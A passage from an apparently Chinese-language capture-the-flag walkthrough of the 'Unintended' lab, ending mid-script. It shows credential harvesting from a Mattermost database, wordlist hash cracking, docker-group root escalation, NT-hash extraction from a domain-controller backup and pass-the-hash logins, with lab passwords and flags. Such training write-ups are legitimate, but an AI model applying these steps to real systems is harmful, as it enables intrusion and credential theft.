> [https://github.com/kelderek/mattermost-mysql-docker-compose](https://github.com/kelderek/mattermost-mysql-docker-compose)
>

![](/image/hackthebox-prolabs/Unintended-8.png)

#### mattermost-mysql-docker-compose
##### 信息来源
> 在与theabbs的对话中提到
>
> [https://github.com/kelderek/mattermost-mysql-docker-compose](https://github.com/kelderek/mattermost-mysql-docker-compose)
>

![](/image/hackthebox-prolabs/Unintended-9.png)

##### 默认凭据
> 在github的env.example文件中我们得知mysql默认账号密码为mmuser/mysql_mmuser_password
>

![](/image/hackthebox-prolabs/Unintended-10.png)

#### cadams
> 在与cadams的对话中提到PostgreSQL是给Mattermost用的
>

![](/image/hackthebox-prolabs/Unintended-11.png)

### 查看网卡
```plain
juan@unintended.vl@web:/$ ifconfig
br-44654a052c6b: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.0.1  netmask 255.255.0.0  broadcast 172.22.255.255
        ether 02:42:32:bd:62:44  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-5b0796f1172c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:cd:ed:da:ac  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-a6533b46d5a2: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.21.0.1  netmask 255.255.0.0  broadcast 172.21.255.255
        ether 02:42:72:27:46:86  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:18:5d:8c:f3  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.13.38.59  netmask 255.255.255.0  broadcast 10.13.38.255
        ether 00:50:56:94:c6:b1  txqueuelen 1000  (Ethernet)
        RX packets 3051112  bytes 353187802 (353.1 MB)
        RX errors 0  dropped 93  overruns 0  frame 0
        TX packets 3326989  bytes 640618300 (640.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12125907  bytes 1353699103 (1.3 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12125907  bytes 1353699103 (1.3 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth2938388: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 3e:40:8c:ce:c8:33  txqueuelen 0  (Ethernet)
        RX packets 4876  bytes 8988852 (8.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5303  bytes 860880 (860.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth0fb73f6: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether da:cf:62:50:55:62  txqueuelen 0  (Ethernet)
        RX packets 5129197  bytes 776595827 (776.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7169976  bytes 732041048 (732.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth49dc652: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether da:ef:c1:ec:b2:5d  txqueuelen 0  (Ethernet)
        RX packets 39770  bytes 18100952 (18.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47745  bytes 6350961 (6.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth63eb5ff: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 6e:eb:62:23:ac:46  txqueuelen 0  (Ethernet)
        RX packets 46497  bytes 13645746 (13.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 37002  bytes 6248282 (6.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethbb3edd0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether e2:dc:99:e7:85:03  txqueuelen 0  (Ethernet)
        RX packets 64272  bytes 14380621 (14.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 56806  bytes 19387464 (19.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethf88aa1c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ether 26:63:ba:24:e0:1a  txqueuelen 0  (Ethernet)
        RX packets 32106  bytes 5052302 (5.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 41013  bytes 4493701 (4.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

### 查看路由
```plain
juan@unintended.vl@web:/$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:c6:b1 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.13.38.59/24 brd 10.13.38.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:18:5d:8c:f3 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-44654a052c6b: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:32:bd:62:44 brd ff:ff:ff:ff:ff:ff
    inet 172.22.0.1/16 brd 172.22.255.255 scope global br-44654a052c6b
       valid_lft forever preferred_lft forever
5: br-5b0796f1172c: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:cd:ed:da:ac brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-5b0796f1172c
       valid_lft forever preferred_lft forever
6: br-a6533b46d5a2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:72:27:46:86 brd ff:ff:ff:ff:ff:ff
    inet 172.21.0.1/16 brd 172.21.255.255 scope global br-a6533b46d5a2
       valid_lft forever preferred_lft forever
8: veth63eb5ff@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-5b0796f1172c state UP group default 
    link/ether 6e:eb:62:23:ac:46 brd ff:ff:ff:ff:ff:ff link-netnsid 4
10: vethbb3edd0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-a6533b46d5a2 state UP group default 
    link/ether e2:dc:99:e7:85:03 brd ff:ff:ff:ff:ff:ff link-netnsid 5
12: veth2938388@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-44654a052c6b state UP group default 
    link/ether 3e:40:8c:ce:c8:33 brd ff:ff:ff:ff:ff:ff link-netnsid 1
14: veth49dc652@if13: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-a6533b46d5a2 state UP group default 
    link/ether da:ef:c1:ec:b2:5d brd ff:ff:ff:ff:ff:ff link-netnsid 2
16: vethf88aa1c@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-5b0796f1172c state UP group default 
    link/ether 26:63:ba:24:e0:1a brd ff:ff:ff:ff:ff:ff link-netnsid 3
18: veth0fb73f6@if17: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-44654a052c6b state UP group default 
    link/ether da:cf:62:50:55:62 brd ff:ff:ff:ff:ff:ff link-netnsid 0
```

### PostgreSQL服务探测
> 成功发现该服务在172.18.0.3 5432中
>

```plain
for i in $(seq 1 10); do
    for net in 172.18.0 172.21.0 172.22.0; do
      (ping -c1 -W1 $net.$i &>/dev/null && echo "$net.$i alive" && nc -zv -w1 $net.$i 5432 2>&1 | grep -v refused) &
    done
  done; wait

Connection to 172.18.0.3 5432 port [tcp/postgresql] succeeded!
```

## PostgreSQL
### 默认凭据
> PGPASSWORD是PostgreSQL客户端工具识别的系统环境变量，用于自动提供数据库连接密码
>
> 利用我们在github发现的MYSQL默认凭据进行登录
>
> + MYSQL_DATABASE=mattermost
> + MYSQL_USER=mmuser
> + MYSQL_PASSWORD="mysql_mmuser_password"
>

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# PGPASSWORD=mmuser_password proxychains -q psql -h 172.18.0.3 -d mattermost -U mmuser
psql (18.1 (Debian 18.1-2), 服务器 13.14)
输入 "help" 来获取帮助信息.

mattermost=# 
```

### 信息收集
#### 数据库表
```plain
                        List of tables
 架构模式 |               名称               |  类型  | 拥有者 
----------+----------------------------------+--------+--------
 public   | audits                           | 数据表 | mmuser
 public   | bots                             | 数据表 | mmuser
 public   | channelmemberhistory             | 数据表 | mmuser
 public   | channelmembers                   | 数据表 | mmuser
 public   | channels                         | 数据表 | mmuser
 public   | clusterdiscovery                 | 数据表 | mmuser
 public   | commands                         | 数据表 | mmuser
 public   | commandwebhooks                  | 数据表 | mmuser
 public   | compliances                      | 数据表 | mmuser
 public   | db_lock                          | 数据表 | mmuser
 public   | db_migrations                    | 数据表 | mmuser
 public   | drafts                           | 数据表 | mmuser
 public   | emoji                            | 数据表 | mmuser
 public   | fileinfo                         | 数据表 | mmuser
 public   | focalboard_blocks                | 数据表 | mmuser
 public   | focalboard_blocks_history        | 数据表 | mmuser
 public   | focalboard_board_members         | 数据表 | mmuser
 public   | focalboard_board_members_history | 数据表 | mmuser
 public   | focalboard_boards                | 数据表 | mmuser
 public   | focalboard_boards_history        | 数据表 | mmuser
 public   | focalboard_categories            | 数据表 | mmuser
 public   | focalboard_category_boards       | 数据表 | mmuser
 public   | focalboard_file_info             | 数据表 | mmuser
 public   | focalboard_notification_hints    | 数据表 | mmuser
 public   | focalboard_preferences           | 数据表 | mmuser
 public   | focalboard_schema_migrations     | 数据表 | mmuser
 public   | focalboard_sessions              | 数据表 | mmuser
 public   | focalboard_sharing               | 数据表 | mmuser
 public   | focalboard_subscriptions         | 数据表 | mmuser
 public   | focalboard_system_settings       | 数据表 | mmuser
 public   | focalboard_teams                 | 数据表 | mmuser
 public   | focalboard_users                 | 数据表 | mmuser
 public   | groupchannels                    | 数据表 | mmuser
 public   | groupmembers                     | 数据表 | mmuser
 public   | groupteams                       | 数据表 | mmuser
 public   | incomingwebhooks                 | 数据表 | mmuser
 public   | ir_category                      | 数据表 | mmuser
 public   | ir_category_item                 | 数据表 | mmuser
 public   | ir_channelaction                 | 数据表 | mmuser
 public   | ir_incident                      | 数据表 | mmuser
 public   | ir_metric                        | 数据表 | mmuser
 public   | ir_metricconfig                  | 数据表 | mmuser
 public   | ir_playbook                      | 数据表 | mmuser
 public   | ir_playbookautofollow            | 数据表 | mmuser
 public   | ir_playbookmember                | 数据表 | mmuser
 public   | ir_run_participants              | 数据表 | mmuser
 public   | ir_statusposts                   | 数据表 | mmuser
 public   | ir_system                        | 数据表 | mmuser
 public   | ir_timelineevent                 | 数据表 | mmuser
 public   | ir_userinfo                      | 数据表 | mmuser
 public   | ir_viewedchannel                 | 数据表 | mmuser
 public   | jobs                             | 数据表 | mmuser
 public   | licenses                         | 数据表 | mmuser
 public   | linkmetadata                     | 数据表 | mmuser
 public   | notifyadmin                      | 数据表 | mmuser
 public   | oauthaccessdata                  | 数据表 | mmuser
 public   | oauthapps                        | 数据表 | mmuser
 public   | oauthauthdata                    | 数据表 | mmuser
 public   | outgoingwebhooks                 | 数据表 | mmuser
 public   | pluginkeyvaluestore              | 数据表 | mmuser
 public   | postacknowledgements             | 数据表 | mmuser
 public   | postreminders                    | 数据表 | mmuser
 public   | posts                            | 数据表 | mmuser
 public   | postspriority                    | 数据表 | mmuser
 public   | preferences                      | 数据表 | mmuser
 public   | productnoticeviewstate           | 数据表 | mmuser
 public   | publicchannels                   | 数据表 | mmuser
 public   | reactions                        | 数据表 | mmuser
 public   | recentsearches                   | 数据表 | mmuser
 public   | remoteclusters                   | 数据表 | mmuser
 public   | retentionidsfordeletion          | 数据表 | mmuser
 public   | retentionpolicies                | 数据表 | mmuser
 public   | retentionpolicieschannels        | 数据表 | mmuser
 public   | retentionpoliciesteams           | 数据表 | mmuser
 public   | roles                            | 数据表 | mmuser
 public   | schemes                          | 数据表 | mmuser
 public   | sessions                         | 数据表 | mmuser
 public   | sharedchannelattachments         | 数据表 | mmuser
 public   | sharedchannelremotes             | 数据表 | mmuser
 public   | sharedchannels                   | 数据表 | mmuser
 public   | sharedchannelusers               | 数据表 | mmuser
 public   | sidebarcategories                | 数据表 | mmuser
 public   | sidebarchannels                  | 数据表 | mmuser
 public   | status                           | 数据表 | mmuser
 public   | systems                          | 数据表 | mmuser
 public   | teammembers                      | 数据表 | mmuser
 public   | teams                            | 数据表 | mmuser
 public   | termsofservice                   | 数据表 | mmuser
 public   | threadmemberships                | 数据表 | mmuser
 public   | threads                          | 数据表 | mmuser
 public   | tokens                           | 数据表 | mmuser
 public   | trueupreviewhistory              | 数据表 | mmuser
 public   | uploadsessions                   | 数据表 | mmuser
 public   | useraccesstokens                 | 数据表 | mmuser
 public   | usergroups                       | 数据表 | mmuser
 public   | users                            | 数据表 | mmuser
 public   | usertermsofservice               | 数据表 | mmuser

```

### Abbie密码获取
#### 方法一：`posts`提取密码
> 在posts聊天记录中抓取到密码Hiu8sy8SA8h2
>

```plain
mattermost=# select message from posts;
...
Here, `Hiu8sy8SA8h2`, change it to one you can actually *remember*, and please make sure you do so lol I have way more important things to do than resetting your passwords  :joy: 
```

```plain
mattermost=# SELECT Message FROM Posts WHERE Message LIKE '%password%';
...
Here, `Hiu8sy8SA8h2`, change it to one you can actually *remember*, and please make sure you do so lol I have way more important things to do than resetting your passwords  :joy: 
```

#### 方法二：hash破解
##### 密码抓取
```plain
mattermost=# select username,email,password from users;
   username    |          email          |                           password                           
---------------+-------------------------+--------------------------------------------------------------
 channelexport | channelexport@localhost | 
 feedbackbot   | feedbackbot@localhost   | 
 appsbot       | appsbot@localhost       | 
 calls         | calls@localhost         | 
 playbooks     | playbooks@localhost     | 
 boards        | boards@localhost        | 
 system-bot    | system-bot@localhost    | 
 cadams        | cartor@unintended.vl    | $2a$10$1LN52Ej8HDksuM51/a6yDeLEQsw5F6pOQRYNxNQZEGezBreDaMRC.
 theabbs       | abbie@unintended.vl     | $2a$10$2INgG1HdPQqqvv/.ljUi/uQb5FGfKxRiYWCoZWUZI1ZIeOE0aV0mu
 juank         | juan@unintended.vl      | $2a$10$XVsJbRoMGb3NmEkOV2bVhuaf2zf2U90z1BH1LR5.9EVphcIClf7aa
(10 行记录)
```

##### 字典创建
> 基于聊天显示的密码遵循姓名+出生年份模式，我们创建了自定义词表
>

```plain
# Usernames and year range
usernames = ["abbie", "spencer", "Abbie", "Spencer", "theabbs"]
years = range(1950, 2021)  # 1950 to 2020 inclusive

# Generate wordlist
with open("usernames_with_years.txt", "w") as file:
    for name in usernames:
        for year in years:
            file.write(f"{name}{year}\n")

print("File 'usernames_with_years.txt' created successfully!")
```

##### 哈希破解
> 成功破解出密码为Abbie1998
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# john abbie_hash --wordlist=./usernames_with_years.txt
Using default input encoding: UTF-8

Press 'q' or Ctrl-C to abort, almost any other key for status
Abbie1998        (?)     
1g 0:00:00:01 DONE (2026-03-23 02:54) 0.9090g/s 196.3p/s 196.3c/s 196.3C/s Abbie1988..Spencer1952
Session completed. 
```

### ABBIE@UNINTENDED.VL
#### Mattermost
##### 凭据登录
> ABBIE@UNINTENDED.VL/Abbie1998成功登录
>

![](/image/hackthebox-prolabs/Unintended-12.png)

##### 凭据发现
> 在和cadams的对话中我们发现了凭据Hiu8sy8SA8h2
>

![](/image/hackthebox-prolabs/Unintended-13.png)

# 10.13.38.58
## netexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# netexec smb 10.13.38.57 -u ABBIE@UNINTENDED.VL -p Hiu8sy8SA8h2 --shares
SMB         10.13.38.57     445    DC               [*] Unix - Samba x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:None) (Null Auth:True)                                          
SMB         10.13.38.57     445    DC               [+] unintended.vl\ABBIE@UNINTENDED.VL:Hiu8sy8SA8h2
SMB         10.13.38.57     445    DC               [*] Enumerated shares
SMB         10.13.38.57     445    DC               Share           Permissions     Remark
SMB         10.13.38.57     445    DC               -----           -----------     ------
SMB         10.13.38.57     445    DC               sysvol                          
SMB         10.13.38.57     445    DC               netlogon                        
SMB         10.13.38.57     445    DC               home                            Home Directories
SMB         10.13.38.57     445    DC               IPC$                            IPC Service (Samba 4.15.13-Ubuntu)    
```

## bloodhound
> 备份操作员可以覆盖安全限制
>
> 回顾dns发现
>

![](/image/hackthebox-prolabs/Unintended-14.png)

![](/image/hackthebox-prolabs/Unintended-15.png)

## ssh登录
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# ssh -l abbie@unintended.vl backup.unintended.vl
```

![](/image/hackthebox-prolabs/Unintended-16.png)

## 查看权限
> 属于 docker 组，这使得通过将根文件系统挂载到容器中成为 root 变得非常简单
>

```plain
abbie@unintended.vl@backup:~$ id
uid=320201104(abbie@unintended.vl) gid=320200513(domain users@unintended.vl) groups=320200513(domain users@unintended.vl),119(docker)
```

## Docker 权限提升
### docker镜像
> 查看现有镜像
>

```plain
abbie@unintended.vl@backup:~$ docker image ls
REPOSITORY   TAG           IMAGE ID       CREATED       SIZE
python       3.11.2-slim   4d2191666712   3 years ago   128MB
```

### 执行特权容器
>  运行容器，挂载宿主机根目录 / 到容器内的 /mnt
>

```plain
docker run -v /:/mnt --rm -it python:3.11.2-slim chroot /mnt sh
```

## Getflag
```plain
# cat flag.txt
UNINTENDED{a28eb03a8e55693ad461460de60f8704}
```

## FTP 管理员凭证 
> /root/scripts/ftp/server.py
>
> 得到凭据ftp_admin/u76n0wn287ak98f
>

```plain
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

authorizer = DummyAuthorizer()

authorizer.add_user("ftp_admin", "u76n0wn287ak98f", "/ftp/volumes/", perm="elradfmw")

handler = FTPHandler
handler.authorizer = authorizer

server_local = FTPServer(("0.0.0.0", 21), handler)

server_local.serve_forever()
```

## FTP登录
> 利用凭据ftp_admin/u76n0wn287ak98f成功登录
>
> 发现/domain_backup文件夹下存放samba-backup-2024-02-17T20-32-13.580437.tar.bz2
>

```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended/blood]
└─# ftp ftp_admin@10.13.38.58

Password: u76n0wn287ak98f
230 Login successful.

ftp> ls
229 Entering extended passive mode (|||51603|).
125 Data connection already open. Transfer starting.
drw-rw----   2 root     root         4096 Jan 25  2024 docker_src
drw-rw----   2 root     root         4096 Feb 17  2024 domain_backup
226 Transfer complete.

ftp>get samba-backup-2024-02-17T20-32-13.580437.tar.bz2
150 File status okay. About to open data connection.
-rw-rw----   1 root     root      1654914 Feb 17  2024 samba-backup-2024-02-17T20-32-13.580437.tar.bz2
```

## 备份文件
> 解压samba-backup-2024-02-17T20-32-13.580437.tar.bz2
>
> 发现这是域控的备份文件
>

```plain
┌──(kali㉿kali)-[~/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─$ dir
dns_update_cache       hklm.ldb   passdb.tdb     sam.ldb.d           secrets.ldb  spn_update_list
dns_update_list        idmap.ldb  privilege.ldb  schannel_store.tdb  secrets.tdb  tls
encrypted_secrets.key  krb5.conf  sam.ldb        secrets.keytab      share.ldb
```

## sam.ldb
> 域控制器（DC）备份中提取的关键数据库文件
>
> 利用ldbsearch 进行提取hash数据
>

```plain
┌──(web)─(root㉿kali)-[/home/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─# ldbsearch -H sam.ldb '(objectClass=user)' sAMAccountName unicodePwd | grep -E 'sAMAccountName|unicodePwd'
sAMAccountName: Guest
sAMAccountName: WEB$
unicodePwd:: tzVaDyiGmW1EqbsKpNv1/Q==
sAMAccountName: DC$
unicodePwd:: TZHemRqI5+meNBqkuhGf4w==
sAMAccountName: juan
unicodePwd:: r637nTfvc5/59gOZB3pvSw==
sAMAccountName: Administrator
unicodePwd:: Nv4kHqDqpTPV+si9f7b4ow==
sAMAccountName: BACKUP$
unicodePwd:: qWaIISPvklFTNcq3egHznQ==
sAMAccountName: cartor
unicodePwd:: fa3bgoJXGgDrZJcJ74lPog==
sAMAccountName: krbtgt
unicodePwd:: golru00IjlqmJGKK2vgoJg==
sAMAccountName: abbie
unicodePwd:: HACddCrRxhvI37++Qp3n6A==
```

## 域管hash
```plain
┌──(web)─(root㉿kali)-[/home/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─# echo "Nv4kHqDqpTPV+si9f7b4ow==" | base64 -d | xxd -p
36fe241ea0eaa533d5fac8bd7fb6f8a3
```

## netexec验证
```plain
┌──(web)─(root㉿kali)-[/home/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─# netexec smb 10.13.38.57 -u Administrator -H 36fe241ea0eaa533d5fac8bd7fb6f8a3
SMB         10.13.38.57     445    DC               [*] Unix - Samba x32 (name:DC) (domain:unintended.vl) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                
SMB         10.13.38.57     445    DC               [+] unintended.vl\Administrator:36fe241ea0eaa533d5fac8bd7fb6f8a3
```

# ROOT ON DC
## smbclient
```plain
smbclient //dc.unintended.vl/home -U Administrator --pw-nt-hash -W unintended.vl --password 36fe241ea0eaa533d5fac8bd7fb6f8a3
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 23 00:51:20 2026
  ..                                  D        0  Sun Feb 25 04:13:16 2024
  .profile                            H      807  Sun Feb 25 04:13:16 2024
  .cache                             DH        0  Sun Feb 25 04:13:16 2024
  .bashrc                             H     3771  Sun Feb 25 04:13:16 2024
  .bash_logout                        H      220  Sun Feb 25 04:13:16 2024
  root.txt                            N       46  Tue May 20 14:04:08 2025
```

## Impacket-smbclient
```plain
┌──(web)─(root㉿kali)-[/home/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─# smbclient.py unintended.vl/administrator@10.13.38.57 -no-pass -hashes :36fe241ea0eaa533d5fac8bd7fb6f8a3
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
Type help for list of commands

# shares
sysvol
netlogon
home
IPC$
# use home
# ls
drw-rw-rw-          0  Mon Mar 23 00:51:20 2026 .
drw-rw-rw-          0  Sun Feb 25 04:13:16 2024 ..
-rw-rw-rw-        807  Sun Feb 25 04:13:16 2024 .profile
drw-rw-rw-          0  Sun Feb 25 04:13:16 2024 .cache
-rw-rw-rw-       3771  Sun Feb 25 04:13:16 2024 .bashrc
-rw-rw-rw-        220  Sun Feb 25 04:13:16 2024 .bash_logout
-rw-rw-rw-         46  Tue May 20 14:04:08 2025 root.txt
```

## Getflag
```plain
┌──(web)─(root㉿kali)-[/home/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─# cat root.txt                                                                                     
UNINTENDED{a48803ba26e7c0f6511dd5047d9de963} 
```



# ROOT ON WEB
## FTP登录
```plain
┌──(web)─(root㉿kali)-[/home/…/htb/Unintended/samba-backup-2024-02-17T20-32-13.580437/private]
└─# ftp ftp_admin@10.13.38.58                                                                              
Connected to 10.13.38.58.

Password: u76n0wn287ak98f
230 Login successful.

ftp> cd docker_src
ftp> ls
229 Entering extended passive mode (|||34411|).
125 Data connection already open. Transfer starting.
-rw-rw----   1 root     root       142245 Jan 25  2024 duplicati-20240125T071045Z.dlist.zip
-rw-rw----   1 root     root     38225049 Jan 25  2024 duplicati-b71dd219377964328aa2c79f4bc7354a5.dblock.zip
-rw-rw----   1 root     root     52343646 Jan 25  2024 duplicati-b9d86c254096f4531b0be8e536a59ff07.dblock.zip
-rw-rw----   1 root     root     52344341 Jan 25  2024 duplicati-ba27818c8bd7a4ea6a506fde8314c48d1.dblock.zip
-rw-rw----   1 root     root       139304 Jan 25  2024 duplicati-i48680ba57a084652a109d584aebc63a9.dindex.zip
-rw-rw----   1 root     root        75366 Jan 25  2024 duplicati-i570def036a8d475c9ec47b861bee206a.dindex.zip
-rw-rw----   1 root     root       161831 Jan 25  2024 duplicati-ie324293d766446ddbe27823f52e30d4c.dindex.zip
226 Transfer complete.
```

## 文件下载
```plain
ftp> get duplicati-20240125T071045Z.dlist.zip
ftp> get duplicati-b71dd219377964328aa2c79f4bc7354a5.dblock.zip
ftp> get duplicati-b9d86c254096f4531b0be8e536a59ff07.dblock.zip
ftp> get duplicati-ba27818c8bd7a4ea6a506fde8314c48d1.dblock.zip
ftp> get duplicati-i48680ba57a084652a109d584aebc63a9.dindex.zip
ftp> get duplicati-i570def036a8d475c9ec47b861bee206a.dindex.zip
ftp> get duplicati-ie324293d766446ddbe27823f52e30d4c.dindex.zip
```

## 恢复备份
> 我们可以使用 [Duplicati 的恢复脚本](https://github.com/duplicati/duplicati/tree/master/Tools/Commandline/RestoreFromPython)从 Linux 恢复备份
>
> 为什么要利用该脚本进行恢复备份，是因为靶机启动了该服务(8200端口上)
>

### server运行
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/duplicati]
└─# ./duplicati-server

未找到数据库加密密钥。数据库将不加密存储。请通过环境变量 SETTINGS_ENCRYPTION_KEY 提供加密密钥，或使用选项 --disable-db-encryption 关闭数据库加密。
服务器已启动，正在监听 localhost 端口 8200
使用以下链接登录：http://localhost:8200/signin.html?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOiJTaWduaW5Ub2tlbiIsInNpZCI6InNlcnZlci1jbGkiLCJuYmYiOjE3NzQyMTI5ODMsImV4cCI6MTc3NDIxMzI4MywiaXNzIjoiaHR0cHM6Ly9kdXBsaWNhdGkiLCJhdWQiOiJodHRwczovL2R1cGxpY2F0aSJ9.zeUSXoCuifmuVrdW0NS3Xr09yHG9TRG5hbM8-UyNmro
```

![](/image/hackthebox-prolabs/Unintended-17.png)

### 恢复文件
#### 选择加密文件夹
![](/image/hackthebox-prolabs/Unintended-18.png)

#### 空密码
![](/image/hackthebox-prolabs/Unintended-19.png)

#### 选择文件
![](/image/hackthebox-prolabs/Unintended-20.png)

#### 输入路径
![](/image/hackthebox-prolabs/Unintended-21.png)

#### 运行
![](/image/hackthebox-prolabs/Unintended-22.png)

## 发现凭据
> /duplicati/config/Duplicati-server.sqlite
>
> 我们拿到了server-passphrase 这方便我们后续进行密码解密
>

```plain
┌──(web)─(root㉿kali)-[/home/…/Unintended/web/duplicati/config]
└─# sqlite3 ./Duplicati-server.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> select * from Option;

-2||server-passphrase|ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk=
-2||server-passphrase-salt|j+7JQsuO7aggNAESQRkCBJd8dwdUE6A9QLTKXM3LB7w=
-2||server-passphrase-trayicon|4f760941-ce8f-4e03-b427-a92319d6d763
-2||server-passphrase-trayicon-hash|VHwBLiNdg/D545Utf8j67DSvqTvBmhpJIWzWmJCiV3o=
-2||last-update-check|638417625259706730
```

## 端口转发
> 回顾10.13.38.59机器，我们发现它开放了Duplicati端口8200，将他转发到本地
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# sshpass -p 'theJUANman2019' ssh -N -L 8200:127.0.0.1:8200 -l 'juan@unintended.vl' 10.13.38.59
```

## web访问
> 访问[http://127.0.0.1:8200/login.html](http://127.0.0.1:8200/login.html)
>

![](/image/hackthebox-prolabs/Unintended-1.png)

## 登录 Duplicati
事实证明，我们可以通过知道服务器密码来登录网页界面。有一篇文章详细解释了这次袭击

[Vulnlab - Unintended](https://blog.apolloteapot.com/vulnlab-unintended)

认证的工作原理是：

1. 从服务器获取 nonce
2. 计算 noncedpwd = SHA256(nonce + server-passphrase)
3. 发送 noncedpwd 作为密码参数

### python脚本
这里有一个Duplicati自动化登录的脚本：

```plain
#!/usr/bin/env python3
import requests
import base64
import hashlib
import json

base = "http://127.0.0.1:8200"
